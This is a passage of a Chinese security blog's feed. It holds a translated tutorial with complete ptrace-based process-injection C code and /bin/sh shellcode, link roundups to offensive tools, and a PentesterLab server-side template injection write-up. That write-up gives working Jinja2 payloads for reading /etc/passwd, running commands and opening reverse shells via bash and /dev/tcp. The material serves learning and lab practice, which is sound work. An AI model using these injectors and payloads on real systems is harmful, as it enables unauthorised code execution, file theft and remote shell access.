    <link href="http://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>http://kevien.github.io/2018/01/28/linux进程注入/</id>
    <published>2018-01-28T09:18:28.000Z</published>
    <updated>2018-03-20T16:13:45.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">译文声明</div><div class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</div><div class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</div><div class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</div><div class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</div></pre></td></tr></table></figure>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我们的代码，但是如何向一个已在运行的进程中注入代码呢?这篇文章我将介绍如何去操作其它进程内存的一些基本技巧…换句话说，就是教你如何去写一个属于你自己的调试器。<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4></li>
<li>在去介绍技术细节之前，让我先来介绍几个需要注入代码到运行中进程的场景。</li>
<li>最初的场景并不是应用在恶意软件，而是应用在内存热补丁上面。运行的程序不能被关闭或者重启，或者说关闭或者重启需要很多的花销。因为这个原因，所以如何在不关闭进程或者不重启进程的情况下去给程序打补丁和更新是前几年一个比较热门的话题。</li>
<li>另外一个主要的应用场景就是调试器以及逆向工具的开发。例如radare2…通过这篇文章你将学习它们是如何工作的。</li>
<li>显然另外的一个主要原因还是恶意软件的发展，病毒、后门等等。我猜大多数的使用者都是这个原因。一个例子，你们很多人都知道meterpreter的进程注入功能，这个功能够让你运行你的payload在一个’无辜’的且正在运行的进程中。</li>
<li>如果你之前读过我的文章，你应该知道我将要讨论linux下的进程注入，基本的原理在不同的操作系统平台下是类似的，所以我希望即使你不是一个linuxer，这篇文章也会对你有用。就说这么多了，下面让我们来看具体细节吧。<h4 id="在linux中进行进程调试"><a href="#在linux中进行进程调试" class="headerlink" title="在linux中进行进程调试"></a>在linux中进行进程调试</h4></li>
<li>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在linux中具有调试功能的工具有ptrace、Gdb、radare2、ddd、strace等，这些工具都是使用ptrace这个系统调用来提供服务的。</li>
<li>ptrace系统调用允许一个进程去调试另外一个进程，使用ptrace能够使我们停止一个目标进程的执行并且能够让我们去查看和修改目标进程中各个寄存器的值以及内存的值。</li>
<li>这里用两种方式去调试一个进程，第一种(也是最直接的一种)就是让我们的调试器去开启我们的进程…fork和exec，这种一般是传入被调试程序的名字参数给gdb或者strace。</li>
<li>另外一种就是我们需要去动态附加我们的调试器到运行的进程。</li>
<li>这篇文章我们主要关注第二种，当你对这些基本的知识点熟悉之后，后面在你调试程序的时候就不会有什么问题了。<h4 id="附加到正在运行的进程"><a href="#附加到正在运行的进程" class="headerlink" title="附加到正在运行的进程"></a>附加到正在运行的进程</h4></li>
<li>修改正在运行的进程之前我们首先做的是要调试它，这个过程被称为附加，这也是gdb的一个命令，让我们看下面的代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/ptrace.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/user.h&gt;</div><div class="line">#include &lt;sys/reg.h&gt;</div><div class="line"></div><div class="line">int</div><div class="line">main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">  pid_t                   target;</div><div class="line">  struct user_regs_struct regs;</div><div class="line">  int                     syscall;</div><div class="line">  long                    dst;</div><div class="line"></div><div class="line">  if (argc != 2)</div><div class="line">    &#123;</div><div class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  target = atoi (argv[1]);</div><div class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</div><div class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(ATTACH):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Waiting for process...\n&quot;);</div><div class="line">  wait (NULL);</div></pre></td></tr></table></figure>
<ul>
<li>在这段代码中我们可以看到main函数接收一个参数，这里是pid（进程id号），即我们想要去注入的进程。我们在后面的每次ptrace系统调用的时候都会用的到。</li>
<li>我们使用ptrace系统调用，第一个参数是PTRACE_ATTACH,第二个参数是我们想要附加的进程id，之后我们调用wait的SIGTRAP信号去判断附加进程是否完成。</li>
<li>这个时候，我们附加的进程停止，我们可以按照我们的意愿去修改它。<h4 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h4></li>
<li>首先我们需要知道我们要将我们的代码注入到哪里，这里有几种可能性：</li>
</ul>
<ol>
<li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。</li>
<li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li>
<li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li>
<li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li>
</ol>
<ul>
<li>简单点儿，我们打算在控制了进程之后，在IP寄存器地址处注入我们的代码，后面的代码中可以看到，我们将直接注入一段典型的得到shell session的shellcode。因此我们也不期望交还控制权给原来的进程。换句话说，我们不在乎是否会破坏原有的进程。<h4 id="获取寄存器和内存信息"><a href="#获取寄存器和内存信息" class="headerlink" title="获取寄存器和内存信息"></a>获取寄存器和内存信息</h4></li>
<li><p>下面的代码注入我们的“恶意代码”到目标进程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">printf (&quot;+ Getting Registers\n&quot;);</div><div class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">  &#123;</div><div class="line">    perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">    exit (1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</div><div class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</div><div class="line">regs.rip += 2;</div></pre></td></tr></table></figure>
</li>
<li><p>上面的代码中首先看到的是我们调用了ptrace,其中第一个参数是PTRACE_GETREGS,这将使我们的程序可以获取到被控制进程的寄存器内容。</p>
</li>
<li>之后，我们使用一个方法注入我们的shellcode到目标进程。注意我们获取了regs.rip(即目标进程当前的IP寄存器的值)，inject_data函数，如你所想，拷贝我们的shellcode到reg.rip所指向的内存地址处。</li>
<li><p>让我们看看是怎么样的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</div><div class="line">&#123;</div><div class="line">  int      i;</div><div class="line">  uint32_t *s = (uint32_t *) src;</div><div class="line">  uint32_t *d = (uint32_t *) dst;</div><div class="line"></div><div class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</div><div class="line">    &#123;</div><div class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(POKETEXT):&quot;);</div><div class="line">	  return -1;</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>很简单是不是，在这个函数中只有两点是需要稍微解释说明的</p>
</li>
</ul>
<ol>
<li>PTRACE_POKETEXT 用来写入目标进程的内存中，这里就是我们真正注入我们的代码到目标进程，此外还有PTRACE_PEEKTEXT函数等.</li>
<li>PTRACE_POKETEXT 函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。<h4 id="运行注入代码"><a href="#运行注入代码" class="headerlink" title="运行注入代码"></a>运行注入代码</h4></li>
</ol>
<ul>
<li><p>现在目标进程的内存已经被注入包含我们需要运行的代码了，现在要做的就是交回我们的控制权给目标进程并让它保持正常运行了。这里有几种不同的方法，这里我们需要做的是分离目标进程，因此，我们停止调试目标进程。下面的方法可以停止调试且让目标进程继续执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</div><div class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Run it!\n&quot;);</div><div class="line"> </div><div class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(DETACH):&quot;);</div><div class="line">	  exit (1);</div><div class="line">	&#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>这里很容易理解，需要注意的是我们需要先把寄存器的值重新设回到以前，然后再去分离。回到前面的章节部分检查一下我们注入的代码…你注意到了在这里<br>为什么要regs.rip += 2了吗</p>
</li>
<li>是的，我们修改了IP寄存器的值，这也是为什么我们能够成功分离并将程序控制权交还给目标进程的原因所在。<h4 id="如何去算出这两个字节"><a href="#如何去算出这两个字节" class="headerlink" title="如何去算出这两个字节"></a>如何去算出这两个字节</h4></li>
<li>当我们调用PTRACE_DEATCH时候需要另外计算的两个字节并不那么容易去发现，我来告诉你们，来满足大家的好奇心。</li>
<li>在整个测试的过程中，当我尝试去注入代码的时候目标进程总是崩掉，一个原因是我的目标程序中栈数据不能执行，我通过execstack 工具去排除这个原因，但是程序还是会崩掉，所以我开启了内存dump分析了一下到底发生了什么。</li>
<li>原因是，你不能同时运行gdb去调试目标进程，否则第一个ptrace会失败，你不能用两个调试器在同一时间调试同一个程序（这句话隐藏了一个反调试的技巧;）,所以当我尝试栈溢出的方式注入代码的时候得到如下的信息：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+ Tracing process 15333</div><div class="line">+ Waiting for process...</div><div class="line">+ Getting Registers</div><div class="line">+ Injecting shell code at 0x7ffe9a708728</div><div class="line">+ Setting instruction pointer to 0x7ffe9a708708</div><div class="line">+ Run it!</div></pre></td></tr></table></figure>
<ul>
<li>当然，这里的地址以及进程名在你的系统中可能不一样，然而，进程崩溃dump的内存可以通过gdb去检查到底发生了什么。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gdb ./target core</div><div class="line">(... gdb start up messages removed ...)</div><div class="line">Reading symbols from ./target...(no debugging symbols found)...done.</div><div class="line">[New LWP 15333]</div><div class="line">Core was generated by `./target&apos;.</div><div class="line">Program terminated with signal SIGSEGV, Segmentation fault.</div><div class="line">#0  0x00007ffe9a708706 in ?? ()</div></pre></td></tr></table></figure>
<ul>
<li>可以看到这里发生了段地址错误，如果你对比了injector的输出信息可以发现这里有两字节的不同，修改这里将会使你注入成功。<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4></li>
<li>为了测试我写了个简单的程序，这个程序只是打印了它自己的pid(你就不用去找它的pid了)，然后每隔2s打印一个helloword，打印10次，这将会给你注入的时间。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;   </div><div class="line">    int i;</div><div class="line"></div><div class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</div><div class="line">    for(i = 0;i &lt; 10; ++i) &#123;</div><div class="line"></div><div class="line">	write (1, &quot;Hello World\n&quot;, 12);</div><div class="line">        sleep(2);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>我所用到的shellcode是通过如下的汇编文件生成的：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">section .text</div><div class="line">        global _start</div><div class="line"></div><div class="line">_start:</div><div class="line">        xor rax,rax</div><div class="line">        mov rdx,rax             ; No Env</div><div class="line">        mov rsi,rax             ; No argv</div><div class="line">        lea rdi, [rel msg]</div><div class="line"></div><div class="line">        add al, 0x3b</div><div class="line"></div><div class="line">        syscall</div><div class="line">        msg db &apos;/bin/sh&apos;,0</div></pre></td></tr></table></figure>
<h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><ul>
<li>ptrace是一个非常强大的工具，这篇文章中我们只是用到了最基本的，现在时候打开你的terminal然后输入man ptrace去学习一下它是如何的神奇了。</li>
<li>如果你有兴趣的话，你还可以进行如下的尝试：</li>
<li>1.修改注入代码到代码空隙</li>
<li>2.使用更加好用的shellcode让它另起一个进程，从而保持原程序正常运行</li>
<li>3.你的shellcode将会运行在目标项目中并且可以读取打开的文件…</li>
<li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="external">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>附上译者的测试截图<br><img src="/2018/01/28/linux进程注入/testinject.png" alt=""><h4 id="20180320更新"><a href="#20180320更新" class="headerlink" title="20180320更新"></a>20180320更新</h4></li>
<li>昨天在看《learing linux binary analysis》的时候看到的一个工具<a href="https://github.com/kevien/saruman" target="_blank" rel="external">saruman</a>,觉得还不错，这是一个已经相对比较稳定的进程注入工具。此外这里还有一个后门server感觉还不错。</li>
<li>注意在编译server的时候记得加上 -fpic -pie的编译参数，其中fpic和pie参数用于生成位置无关可执行程序，其中fpic用于编译阶段，pie用于链接阶段。<br><img src="/2018/01/28/linux进程注入/poc.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/di
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180122安全动态</title>
    <link href="http://kevien.github.io/2018/01/22/20180122%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/22/20180122安全动态/</id>
    <published>2018-01-22T04:32:58.000Z</published>
    <updated>2018-01-26T15:11:14.080Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>钓鱼邮件恶意文档制作技巧<br><a href="http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/" target="_blank" rel="external">http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/</a></li>
<li>一份关于 OSX 和 iOS 的安全资源集合<br><a href="https://github.com/kai5263499/osx-security-awesome" target="_blank" rel="external">https://github.com/kai5263499/osx-security-awesome</a></li>
<li>渗透技巧——利用tscon实现未授权登录远程桌面<br><a href="http://www.4hou.com/penetration/10015.html" target="_blank" rel="external">http://www.4hou.com/penetration/10015.html</a></li>
<li>Java RASP浅析——以百度OpenRASP为例<br><a href="https://paper.seebug.org/513/" target="_blank" rel="external">https://paper.seebug.org/513/</a></li>
<li>Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—CVE-2018-1000006<br><a href="https://xianzhi.aliyun.com/forum/topic/1990" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1990</a></li>
<li><p>语音识别中的定向攻击 - 克隆一段音频，只修改我们指定的词<br><a href="https://arxiv.org/pdf/1801.01944.pdf" target="_blank" rel="external">https://arxiv.org/pdf/1801.01944.pdf</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">那以后的语音还能当做证据吗？！</div></pre></td></tr></table></figure>
</li>
<li><p>《Cracking Codes with Python》Python 密码算法破解书籍<br><a href="http://inventwithpython.com/cracking/" target="_blank" rel="external">http://inventwithpython.com/cracking/</a></p>
</li>
<li>Trojanize - 基于 WinRAR (SFX) 实现的木马植入工具，可以用这个工具生成一个内嵌木马的自解压文件<br><a href="https://github.com/r00t-3xp10it/trojanizer" target="_blank" rel="external">https://github.com/r00t-3xp10it/trojanizer</a></li>
<li>将最近泄露的 Exploit.in 和 Leakbase 密码库放到 ELK 中搜索<br><a href="https://outflank.nl/blog/2018/01/23/public-password-dumps-in-elk/" target="_blank" rel="external">https://outflank.nl/blog/2018/01/23/public-password-dumps-in-elk/</a></li>
<li>ProcInfo - macOS 上用于监视进程的开源库<br><a href="https://github.com/objective-see/ProcInfoc" target="_blank" rel="external">https://github.com/objective-see/ProcInfoc</a></li>
<li>FakeImageExploiter - 伪造图片实现漏洞利用的工具<br><a href="https://github.com/r00t-3xp10it/FakeImageExploiter" target="_blank" rel="external">https://github.com/r00t-3xp10it/FakeImageExploiter</a></li>
<li>PHP CVE-2018-5711 - Hanging Websites by a Harmful GIF，一个 GIF 图片宕掉你的服务器<br><a href="http://blog.orange.tw/2018/01/php-cve-2018-5711-hanging-websites-by.html" target="_blank" rel="external">http://blog.orange.tw/2018/01/php-cve-2018-5711-hanging-websites-by.html</a></li>
<li>一篇文章走进Mac逆向的世界<br><a href="http://www.alonemonkey.com/2017/05/31/get-start-with-mac-reverse/" target="_blank" rel="external">http://www.alonemonkey.com/2017/05/31/get-start-with-mac-reverse/</a></li>
<li>Exploit 编写方面的资料整理<br><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Exploit%20Development.md" target="_blank" rel="external">https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Exploit%20Development.md</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;钓鱼邮件恶意文档制作技巧&lt;br&gt;&lt;a href=&quot;http://www.rvrsh3ll.net
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>从一道pentesterlab的题目说起</title>
    <link href="http://kevien.github.io/2018/01/16/%E4%BB%8E%E4%B8%80%E9%81%93pentesterlab%E7%9A%84%E9%A2%98%E7%9B%AE%E8%AF%B4%E8%B5%B7/"/>
    <id>http://kevien.github.io/2018/01/16/从一道pentesterlab的题目说起/</id>
    <published>2018-01-16T14:04:50.000Z</published>
    <updated>2018-03-08T10:58:42.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template Injection)的题目,目标是要执行任意命令，之前也没分析过SSTI的漏洞，所以简单看了下没搞定,后来有其它的事情就没看，这两天又看了下，觉得还是挺有意思的，就记录一下。<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4></li>
<li>SSTI原理就不讲了，不是这篇文章的重点，想要了解可以参考Reference中的链接。<br>这个题目和Reference文章基本是一样的。</li>
<li><p>读文件就不解释了 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</div><div class="line">(&apos;/etc/passwd&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>这里是通过file.read()方法直接读文件，然后直接显示在页面上的。但是如何实现命令执行反弹shell呢?</p>
</li>
<li>通过列举当前object下的子类可以发现有subprocess的Popen类，大家应该知道Popen是直接可以执行命令的，要索引类Popen，使用index不行（原因不明），但也可以通过笨方法自己索引<br><img src="/2018/01/16/从一道pentesterlab的题目说起/subprocess.png" alt=""></li>
<li><img src="/2018/01/16/从一道pentesterlab的题目说起/indexpopen.png" alt=""></li>
<li>索引233，后面就可以执行命令了，但是不能回显，所以可以把我们的命令执行后结果写入到文件，然后再通过读文件读出来。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/writecommand.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</div><div class="line">[233](&quot;id &gt;/tmp/M0rk.txt&quot;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/01/16/从一道pentesterlab的题目说起/readfile.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</div><div class="line">(&apos;/tmp/M0rk.txt&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>那能不能拿到shell呢？答案是肯定的.<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</div><div class="line">[233](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/01/16/从一道pentesterlab的题目说起/shell.png" alt=""></p>
<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><ul>
<li>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></li>
<li><p>一步一步找到os.system的索引为138</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</div><div class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>同样可以拿到shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</div><div class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[138]</div><div class="line">(&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><ul>
<li>本来想写个长文介绍SSTI原理以及python沙箱绕过原理的，后来发现无非还是翻译英文原著的文章，所以想了解原理的直接去看英文原版文章就好，0.0<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a></li>
<li><a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2 - Part 2</a></li>
<li><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="external">CSAW-CTF Python sandbox write-up</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template In
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180115安全动态</title>
    <link href="http://kevien.github.io/2018/01/15/20180115%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/15/20180115安全动态/</id>
    <published>2018-01-15T03:03:42.000Z</published>
    <updated>2018-01-19T10:57:08.477Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>RPO攻击技术浅析<br><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="external">http://blog.nsfocus.net/rpo-attack/</a></li>
<li>挖洞经验 | 看我如何发现D-Link 815N路由器的RCE 0-day漏洞<br><a href="http://www.freebuf.com/vuls/160181.html" target="_blank" rel="external">http://www.freebuf.com/vuls/160181.html</a></li>
<li>linux-inject：注入代码到运行的Linux进程中<br><a href="http://blog.csdn.net/hpp24/article/details/52125568" target="_blank" rel="external">http://blog.csdn.net/hpp24/article/details/52125568</a></li>
<li>security-apis - 安全相关服务的公共 JSON API 收集列表<br><a href="https://github.com/deralexxx/security-apis" target="_blank" rel="external">https://github.com/deralexxx/security-apis</a></li>
<li>WAF Evasion Techniques<br><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" target="_blank" rel="external">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a><br><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="external">https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0</a></li>
<li>ews-crack - Exchange ews 接口的暴力破解脚本<br><a href="https://github.com/mikesiegel/ews-crack" target="_blank" rel="external">https://github.com/mikesiegel/ews-crack</a></li>
<li>Windows 平台利用 NTFS ADS 实现隐藏数据的方法<br><a href="http://www.darknessgate.com/security-tutorials/date-hiding/ntfs-alternate-data-streams/" target="_blank" rel="external">http://www.darknessgate.com/security-tutorials/date-hiding/ntfs-alternate-data-streams/</a></li>
